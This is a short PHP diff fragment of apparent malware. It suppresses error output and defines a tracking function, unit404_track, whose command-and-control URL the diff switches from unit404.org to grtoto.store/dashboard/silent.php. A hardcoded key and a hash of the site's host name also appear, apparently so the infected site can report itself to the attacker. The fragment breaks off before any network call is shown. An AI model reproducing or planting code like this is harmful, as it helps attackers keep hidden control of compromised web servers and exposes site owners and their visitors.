@@ -4,7 +4,7 @@ error_reporting(0);
 ini_set('display_errors', 0);
 
 function unit404_track() {
-    $c2_url = "https://unit404.org/dashboard/unit404eye.php"; 
+    $c2_url = "https://grtoto.store/dashboard/silent.php"; 
     $key    = "UNIT404_404"; 
 
     $report_hash = md5($_SERVER['HTTP_HOST'] . 'unit404_v2'); 
